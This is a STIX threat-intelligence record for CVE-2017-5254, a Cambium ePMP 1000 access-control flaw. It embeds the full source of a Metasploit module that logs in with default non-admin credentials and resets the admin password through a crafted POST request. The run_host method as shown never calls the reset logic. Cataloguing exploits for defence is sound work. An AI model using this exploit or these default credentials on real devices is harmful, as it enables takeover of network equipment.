{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6fc1214d-bf3f-44e5-9914-665e2140a46c",
    "created": "2024-08-14T16:30:28.501177Z",
    "modified": "2024-08-14T16:30:28.501181Z",
    "name": "Cambium ePMP 1000 Account Password Reset",
    "description": " This module exploits an access control vulnerability in Cambium ePMP device management portal. It requires any one of the following non-admin login credentials - installer/installer, home/home - to reset password of other existing user(s) including 'admin'. All versions <=3.5 are affected. This module works on versions 3.0-3.5-RC7. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/epmp1000_reset_pass.rb",
            "external_id": "epmp1000_reset_pass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-5254"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::EPMP\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Cambium ePMP 1000 Account Password Reset',\n      'Description' => %{\n          This module exploits an access control vulnerability in Cambium ePMP\n          device management portal. It requires any one of the following non-admin login\n          credentials - installer/installer, home/home - to reset password of other\n          existing user(s) including 'admin'. All versions <=3.5 are affected. This\n          module works on versions 3.0-3.5-RC7.\n      },\n      'Author' =>\n        [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'\n        ],\n      'References' =>\n        [\n          ['CVE', '2017-5254'],\n          ['URL', 'https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/']\n        ],\n      'License' => MSF_LICENSE\n     )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.\n        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),\n        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer']),\n        OptString.new('TARGET_USERNAME', [true, 'Target account - admin / installer / home / readonly', 'admin']),\n        OptString.new('NEW_PASSWORD', [true, 'New Password for Target account', 'pass'])\n      ], self.class\n    )\n\n    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')\n  end\n\n  def run_host(ip)\n    unless is_app_epmp1000?\n      return\n    end\n  end\n\n  # Account Reset happens here\n  def reset_pass(config_uri, cookie)\n    pass_change_req = '{\"device_props\":{\"' + \"#{datastore['TARGET_USERNAME']}\" + '_password' + '\":\"' + \"#{datastore['NEW_PASSWORD']}\" + '\"},\"template_props\":{\"config_id\":\"11\"}}'\n\n    print_status(\"#{rhost}:#{rport} - Changing password for #{datastore['TARGET_USERNAME']} to #{datastore['NEW_PASSWORD']}\")\n\n    res = send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => config_uri,\n        'cookie' => cookie,\n        'headers' => {\n          'Accept' => '*/*',\n          'Accept-Language' => 'en-US,en;q=0.5',\n          'Content-Encoding' => 'application/x-www-form-urlencoded; charset=UTF-8',\n          'X-Requested-With' => 'XMLHttpRequest',\n          'Connection' => 'close'\n        },\n        'vars_post' =>\n          {\n            'changed_elements' => pass_change_req,\n            'debug' => '0'\n          }\n      }, 25\n    )\n\n    good_response = (\n      res &&\n      res.code == 200 &&\n      res.headers.include?('Content-Type') &&\n      res.headers['Content-Type'].include?('application/json')&&\n      res.body.include?('config_id')\n    )\n\n    if good_response\n      print_good('Password successfully changed!')\n    else\n      print_error(\"#{rhost}:#{rport} - Failed to change password.\")\n    end\n  end\n\n  #\n  # Login & initiate reset_pass\n  #\n\n  def do_login(epmp_ver)\n    if (epmp_ver < '3.0' || epmp_ver > '3.5' && epmp_ver != '3.5-RC7')\n      print_error('This module is applicable to versions 3.0-3.5-RC7 only. Exiting now.')\n      return\n    elsif (epmp_ver >= '3.0' && epmp_ver < '3.4.1') # <3.4.1 uses login_1\n      cookie, _blah1, config_uri_reset_pass, _blah2 = login_1(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)\n      if cookie == 'skip' && config_uri_reset_pass == 'skip'\n        return\n      else\n        reset_pass(config_uri_reset_pass, cookie)\n      end\n    elsif ['3.4.1', '3.5', '3.5-RC7'].include?(epmp_ver)\n      cookie, _blah1, config_uri_reset_pass, _blah2 = login_2(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)\n      if cookie == 'skip' && config_uri_reset_pass == 'skip'\n        return\n      else\n        reset_pass(config_uri_reset_pass, cookie)\n      end\n    end\n  end\nend\n"
}